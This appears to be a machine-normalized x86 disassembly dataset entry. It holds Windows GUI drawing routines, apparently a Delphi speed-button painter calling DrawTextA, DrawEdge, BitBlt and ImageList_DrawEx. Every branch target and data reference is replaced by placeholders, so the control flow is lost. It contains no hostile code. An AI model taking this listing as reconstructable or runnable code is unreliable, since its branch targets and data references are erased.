call sub_426ec4
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_4221f8
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_4225d0
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_4221f8
push 0x0
mov eax ebx
call sub_4229f0
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_4229f0
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426ec4
call sub_4229f0
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_4229f0
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_4221f8
push 0x0
mov eax ebx
call sub_4229f0
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_4229f0
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426ec4
call sub_4229f0
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_4229f0
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_426ec4
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_421a0c
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_427c34
mov eax [ ebp - 0x14 ]
call sub_426ec4
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_4221f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40316c
mov eax [ ebp - 0x14 ]
call sub_40316c
retn
sub_43109c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_430ac4
mov esi eax
call sub_432b54
call sub_432c34
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4229f0
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44cdac
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_42154c
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4229f0
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44cdac
push eax
call ImageList_DrawEx
call sub_432b54
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_432e34
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_44cdac
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_4229f0
push eax
call sub_432b54
lea ecx [ ebp - 0x14 ]
pop edx
call sub_432d84
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_431200
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_422314
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404200
push eax
mov eax esi
call sub_404400
push eax
mov eax ebx
call sub_4229f0
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_421a0c
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404200
push eax
mov eax esi
call sub_404400
push eax
mov eax ebx
call sub_4229f0
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_421a0c
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404200
push eax
mov eax esi
call sub_404400
push eax
mov eax ebx
call sub_4229f0
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4312e0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_416a38
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_416a38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_416a38
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_416a60
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_416a38
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_416a60
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_404200
push eax
mov eax [ ebp + 0x20 ]
call sub_404400
push eax
mov eax [ ebp - 0x8 ]
call sub_4229f0
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_416a38
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_404200
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_416a38
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_416a38
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_416a38
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_432b54
call sub_432c34
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_43160c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4312e0
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_43109c
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_431200
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_43167c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e8f4
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_4316a0
push ebx
mov ebx eax
mov eax ebx
call sub_44bfd0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4316ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_43171c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_431fcc
sub_43173c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_432058
sub_43175c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4308c0
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_431f8c
mov ecx esi
xor edx edx
mov eax ebx
call sub_447654
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_43fcdc
mov edx 0xff00000f
mov eax ebx
call sub_43fd50
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43181c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4476b0
mov eax [ esi + 0x16c ]
call sub_40316c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_431854
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_431c7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_4228ec
call sub_432b54
call sub_432c34
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_416a60
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_4229f0
mov edx eax
mov eax esi
call sub_43cd04
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_4229f0
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_4229f0
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_432b54
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_432f20
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_4229f0
push eax
call sub_432b54
lea ecx [ ebp - 0x28 ]
pop edx
call sub_432d40
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_4229f0
push eax
call sub_432b54
lea ecx [ ebp - 0x28 ]
pop edx
call sub_432ca4
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_432b54
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_432e34
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_4229f0
push eax
call sub_432b54
lea ecx [ ebp - 0x28 ]
pop edx
call sub_432d40
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_4229f0
push eax
call sub_432b54
lea ecx [ ebp - 0x28 ]
pop edx
call sub_432ca4
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_4221f8
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_4225d0
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_416a38
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_43fbb0
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_441ec4
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_43160c
mov edx 0xff000014
mov eax 0xff00000f
call sub_428a38
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_4221cc
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_4225d0
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431c85
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_416a38
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_421a0c
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_43fbb0
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_441ec4
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_43160c
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_431c8c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43e45c
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_440d98
jmp r-xdata
sub_431cf0
push ebx
mov ebx eax
mov eax ebx
call sub_441ca0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_430ac4
pop ebx
retn
sub_431d1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_4411ac
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431d74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_441464
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_431c8c
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_43f5b4
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_43f5f8
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_431e14
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44150c
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_43f5b4
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_43f5f8
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_431fcc
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_431c8c
mov eax ebx
mov si 0xffeb
call sub_403368
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_431f60
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_430a9c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431f94
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_44311c
sub_431fcc
